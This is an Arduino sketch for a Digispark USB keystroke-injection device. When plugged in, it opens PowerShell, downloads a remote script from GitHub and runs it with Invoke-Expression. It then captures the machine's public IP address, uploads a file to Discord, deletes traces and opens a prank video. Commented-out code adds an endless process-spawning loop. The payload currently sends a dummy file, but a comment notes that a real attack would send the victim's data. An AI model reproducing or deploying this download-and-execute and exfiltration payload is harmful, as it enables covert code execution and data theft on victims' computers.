#include "DigiKeyboard.h"

#define KEY_UP 0x52
#define KEY_DOWN 0x51
#define KEY_LEFT 0x50
#define KEY_RIGHT 0x4F

const char* screenshotFolder = "Home\\Screenshots";
const int delayShort = 300;
const int delayMedium = 600;
const int delayLong = 1000;

void setConsoleMode(int columns, int lines) {
  DigiKeyboard.print("MODE CON: COLS=" + String(columns) + " LINES=" + String(lines));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayShort);
}

void setConsoleColor(int backgroundColor, int textColor) {
  DigiKeyboard.print("COLOR " + String(backgroundColor) + String(textColor));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayMedium);
}

void startLoopCommand() {
  DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void openCmd() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(delayMedium);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void openPS() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(delayMedium);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void setupCmdWindow() {
  setConsoleMode(15, 1);
  setConsoleColor(1, 15);
  startLoopCommand();
}

void setupPsWindow() {
    // downloads the Upload-Discord PS function from GitHub
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/Marquito0077/Team-Echo-Repo/main/Discord_Upload_PowerShell.ps1");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Invoke-Expression $($ScriptFromGitHub.content)");
}

void executeScript1() {
  //openCmd();
  //setupCmdWindow();
  openPS();
  setupPsWindow();
}

void captureIpAddress() {
  // DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // DigiKeyboard.delay(delayMedium);
  // DigiKeyboard.print("https://www.whatismyip.com/");
  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // DigiKeyboard.delay(delayLong);
  // DigiKeyboard.sendKeyStroke(70, MOD_GUI_LEFT); // Para captura de pantalla completa
  // DigiKeyboard.delay(delayLong);

  DigiKeyboard.delay(1000);
  DigiKeyboard.println('(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content | Out-File -FilePath userIP.txt');
  DigiKeyboard.delay(1000);
  DigiKeyboard.println('Upload-Discord -file "userIP.txt"');
}

void openFileExplorerAndNavigate() {
  DigiKeyboard.print("File Explorer");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayMedium);
  DigiKeyboard.print(screenshotFolder);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void executeScript2() {
  captureIpAddress();
  // openFileExplorerAndNavigate();
}

void setup() {
  // DigiKeyboard.delay(2000);
  // DigiKeyboard.sendKeyStroke(0);
  // DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // DigiKeyboard.delay(600);
  // DigiKeyboard.print("https://youtu.be/dQw4w9WgXcQ?t=43s");
  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // DigiKeyboard.delay(5000);

  // Ejecutar el resto del programa original
  //executeScript1();
  //executeScript2();


  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(delayMedium);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);
  DigiKeyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/Marquito0077/Team-Echo-Repo/main/Discord_Upload_PowerShell.ps1");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Invoke-Expression $($ScriptFromGitHub.content)");

  DigiKeyboard.delay(1500);
  DigiKeyboard.println("(Invoke-WebRequest -uri 'http://ifconfig.me/ip').Content | Out-File -FilePath userIP.txt");
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("Upload-Discord -file 'dummy.txt'"); // It will send a dummy file for privacy reasons.
                                                            // in a real attack, the victim's address won't be so lucky.
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("rm userIP.txt");

  DigiKeyboard.delay(1500);
  DigiKeyboard.println("Start-Process 'https://youtu.be/dQw4w9WgXcQ?t=43s'");

}

void loop() {
  // BRANCH A - EMPTY
}
